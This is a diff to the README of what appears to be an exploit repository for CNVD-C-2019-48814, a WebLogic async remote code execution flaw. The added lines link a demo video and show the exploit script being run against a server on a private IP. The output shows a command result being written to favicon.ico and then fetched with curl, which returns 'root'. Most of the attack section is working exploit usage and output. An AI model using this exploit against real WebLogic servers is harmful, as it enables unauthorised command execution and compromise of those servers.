@@ -12,6 +12,35 @@ http://10.10.20.166:7001/_async/AsyncResponseService
 ```
 curl -i http://10.10.20.166:7001/_async/favicon.ico
 ```
+##  CNVD-C-2019-48814 Video
+
+[![CNVD-C-2019-48814](https://i.ytimg.com/vi/KEgOrgcLu0s/hqdefault.jpg?sqp=-oaymwEZCNACELwBSFXyq4qpAwsIARUAAIhCGAFwAQ==&rs=AOn4CLCLGk3OZ83msmbe5IgfAq6EFN2Dhw)](https://github.com/jas502n/CNVD-C-2019-48814/blob/master/CNVD-C-2019-48814.mp4)
+
+```
+python CNVD-C-2019-48814.py -u  http://10.10.20.166:7001  -p 1.txt
+
+>>>>Common See:
+
+write website favicon.ico
+Don't Need RMI Server
+
+http://10.10.20.166:7001/_async/favicon.ico
+
+>>>>Request Success!
+status_code:202
+
+C:\Users\CTF\Desktop\weblogic\byte>curl -i http://10.10.20.166:7001/_async/favicon.ico
+HTTP/1.1 200 OK
+Date: Thu, 25 Apr 2019 14:37:49 GMT
+Accept-Ranges: bytes
+Content-Length: 5
+Last-Modified: Thu, 25 Apr 2019 14:37:45 GMT
+X-Powered-By: Servlet/2.5 JSP/2.1
+
+root
+
+```
+## Use RMI
 ![](./python.jpg)
 
 ![](./burpsuite.jpg)
